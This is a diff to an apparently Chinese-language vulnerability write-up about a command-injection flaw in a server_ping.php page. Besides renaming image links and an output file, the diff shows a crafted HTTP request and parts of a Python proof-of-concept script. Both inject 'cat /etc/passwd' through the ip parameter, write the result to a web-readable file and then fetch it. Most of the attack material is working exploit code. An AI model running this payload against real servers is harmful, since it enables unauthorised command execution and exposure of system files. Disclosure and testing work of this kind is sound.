@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](image/am-1.png)
+![](http://wikioss.peiqi.tech/vuln/am-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 存在漏洞的文件为 **server_ping.php**
 
@@ -63,12 +63,12 @@ GET传入 **$ip参数** 后直接命令执行，并且文件无权限要求
 请求包为
 
 ```
-GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1 HTTP/1.1
+GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
 ```
 
-![](image/am-2.png)
+![](http://wikioss.peiqi.tech/vuln/am-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -97,7 +97,7 @@ def title():
     print('+------------------------------------------')
 
 def POC_1(target_url):
-    vuln_url = target_url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1"
+    vuln_url = target_url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1"
     headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -105,9 +105,9 @@ def POC_1(target_url):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
-        print("\033[36m[o] 正在执行 cat /etc/passwd>../../pq.txt \033[0m".format(target_url))
+        print("\033[36m[o] 正在执行 cat /etc/passwd>../../test.txt \033[0m".format(target_url))
         if "parent" in response.text and response.status_code == 200:
-            vuln_url = target_url + "/pq.txt"
+            vuln_url = target_url + "/test.txt"
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -131,4 +131,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/am-3.png)
+![](http://wikioss.peiqi.tech/vuln/am-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
